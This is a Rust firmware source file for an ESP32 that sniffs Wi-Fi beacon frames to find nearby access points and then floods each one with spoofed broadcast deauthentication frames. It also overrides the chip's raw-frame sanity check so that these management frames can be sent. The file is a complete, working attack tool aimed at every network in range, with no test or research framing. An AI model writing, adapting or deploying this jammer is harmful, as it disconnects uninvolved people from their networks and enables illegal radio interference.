#![no_std]
#![no_main]
#![deny(
    clippy::mem_forget,
    reason = "mem::forget is generally not safe to do with esp_hal types, especially those \
    holding buffers for the duration of a data transfer."
)]
#![deny(clippy::large_stack_frames)]

use alloc::{collections::BTreeMap, vec::Vec};
use core::cell::RefCell;
use core::sync::atomic::{AtomicBool, Ordering};
use embassy_executor::Spawner;
use embassy_sync::blocking_mutex::raw::CriticalSectionRawMutex;
use embassy_sync::mutex::Mutex;
use embassy_time::Timer;
use esp_alloc as _;
use esp_hal::interrupt::software::SoftwareInterruptControl;
use esp_hal::timer::timg::TimerGroup;
use esp_println::println;
use esp_sync::NonReentrantMutex;

#[panic_handler]
fn panic(info: &core::panic::PanicInfo) -> ! {
    println!("PANIC: {}", info);
    loop {}
}

#[unsafe(no_mangle)]
pub extern "C" fn ieee80211_raw_frame_sanity_check() -> i32 {
    0
}

extern crate alloc;

// This creates a default app-descriptor required by the esp-idf bootloader.
// For more information see: <https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/system/app_image_format.html#application-description>
esp_bootloader_esp_idf::esp_app_desc!();

#[derive(Clone, Copy)]
struct ApEntry {
    bssid: [u8; 6],
    last_seen_secs: u64,
}

static AP_MAP: NonReentrantMutex<RefCell<BTreeMap<u32, Vec<ApEntry>>>> =
    NonReentrantMutex::new(RefCell::new(BTreeMap::new()));
static SHARED_CONTROLLER: Mutex<
    CriticalSectionRawMutex,
    Option<esp_radio::wifi::WifiController<'_>>,
> = Mutex::new(None);
static SHARED_INTERFACE: Mutex<CriticalSectionRawMutex, Option<esp_radio::wifi::Interfaces<'_>>> =
    Mutex::new(None);

static IS_DEAUTHING: AtomicBool = AtomicBool::new(false);

#[allow(
    clippy::large_stack_frames,
    reason = "it's not unusual to allocate larger buffers etc. in main"
)]
#[esp_rtos::main]
async fn main(spawner: Spawner) {
    esp_alloc::heap_allocator!(#[esp_hal::ram(reclaimed)] size: 64 * 1024);
    esp_alloc::heap_allocator!(size: 128 * 1024);
    // Initialize peripherals
    let peripherals = esp_hal::init(esp_hal::Config::default());
    let timg0 = TimerGroup::new(peripherals.TIMG0);
    let sw_interrupt = SoftwareInterruptControl::new(peripherals.SW_INTERRUPT);

    AP_MAP.with(|map_cell| {
        let mut map = map_cell.borrow_mut();
        for channel in 1..=14 {
            map.entry(channel).or_insert_with(Vec::new);
        }
    });

    esp_rtos::start(timg0.timer0, sw_interrupt.software_interrupt0);

    let (mut controller, mut interfaces) =
        esp_radio::wifi::new(peripherals.WIFI, Default::default())
            .expect("Wifi should be supported!");
    let _ = controller.set_channel(6, esp_radio::wifi::SecondaryChannel::None);
    {
        let mut guard = SHARED_CONTROLLER.lock().await;
        *guard = Some(controller);
    }

    let sniffer = &mut interfaces.sniffer;
    let _ = sniffer.set_promiscuous_mode(true);

    sniffer.set_receive_cb(|packet| {
        let len = packet.len;
        let rx_cntl = packet.rx_cntl;

        if len >= 24 && packet.data[0] == 0x80 {
            let mut bssid = [0; 6];
            bssid.copy_from_slice(&packet.data[16..22]);

            let channel = rx_cntl.channel;

            let now = embassy_time::Instant::now().as_secs();

            AP_MAP.with(|map_cell| {
                let mut map = map_cell.borrow_mut();

                for (ch, ap_vec) in map.iter_mut() {
                    if *ch != channel {
                        ap_vec.retain(|e| e.bssid != bssid);
                    }
                }

                if let Some(ap_vec) = map.get_mut(&channel) {
                    if let Some(entry) = ap_vec.iter_mut().find(|e| e.bssid == bssid) {
                        entry.last_seen_secs = now;
                    } else {
                        ap_vec.push(ApEntry {
                            bssid,
                            last_seen_secs: now,
                        });
                    }
                }
            });
        }
    });

    {
        let mut guard = SHARED_INTERFACE.lock().await;
        *guard = Some(interfaces);
    }

    spawner.spawn(channel_hop_task().unwrap());
    spawner.spawn(ap_cleanup_task().unwrap());
    spawner.spawn(ap_jaming_task().unwrap());

    loop {
        Timer::after_millis(1).await;
    }
}

#[embassy_executor::task]
async fn ap_cleanup_task() {
    loop {
        let now = embassy_time::Instant::now().as_secs();

        AP_MAP.with(|map_cell| {
            let mut map = map_cell.borrow_mut();

            for (_, ap_vec) in map.iter_mut() {
                ap_vec.retain(|entry| {
                    let active = (now - entry.last_seen_secs) <= 10;
                    active
                });
            }
        });

        Timer::after(embassy_time::Duration::from_secs(5)).await;
    }
}

#[embassy_executor::task]
async fn channel_hop_task() {
    let mut current_channel: u8 = 1;

    loop {
        if IS_DEAUTHING.load(Ordering::Relaxed) {
            Timer::after(embassy_time::Duration::from_millis(10)).await;
            continue;
        }

        {
            let mut guard = SHARED_CONTROLLER.lock().await;
            if let Some(controller) = guard.as_mut() {
                let _ = controller
                    .set_channel(current_channel, esp_radio::wifi::SecondaryChannel::None);
            }
        }
        current_channel += 1;
        if current_channel > 14 {
            current_channel = 1;
        }

        Timer::after(embassy_time::Duration::from_millis(10)).await;
    }
}

#[embassy_executor::task]
async fn ap_jaming_task() {
    loop {
        let mut targets = Vec::new();

        AP_MAP.with(|map_cell| {
            let map = map_cell.borrow_mut();
            for (channel, ap_vec) in map.iter() {
                for entry in ap_vec {
                    targets.push((*channel, entry.bssid));
                }
            }
        });

        if targets.is_empty() {
            Timer::after(embassy_time::Duration::from_micros(1)).await;
            continue;
        }

        IS_DEAUTHING.store(true, Ordering::Relaxed);

        for (channel, bssid) in targets {
            {
                let mut guard = SHARED_CONTROLLER.lock().await;
                if let Some(controller) = guard.as_mut() {
                    let _ = controller
                        .set_channel(channel as u8, esp_radio::wifi::SecondaryChannel::None);
                }
            }
            Timer::after(embassy_time::Duration::from_millis(5)).await;

            let mut packet = [0u8; 26];

            packet[0] = 0xC0;

            packet[4..10].copy_from_slice(&[0xFF; 6]);

            packet[10..16].copy_from_slice(&bssid);

            packet[16..22].copy_from_slice(&bssid);

            packet[24] = 0x03;

            {
                let mut guard = SHARED_INTERFACE.lock().await;
                if let Some(interface) = guard.as_mut() {
                    match interface.sniffer.send_raw_frame(true, &packet, false) {
                        Ok(_) => {}
                        Err(_) => {}
                    }
                }
            }

            Timer::after(embassy_time::Duration::from_millis(1)).await;
        }

        IS_DEAUTHING.store(false, Ordering::Relaxed);

        Timer::after(embassy_time::Duration::from_millis(5)).await;
    }
}
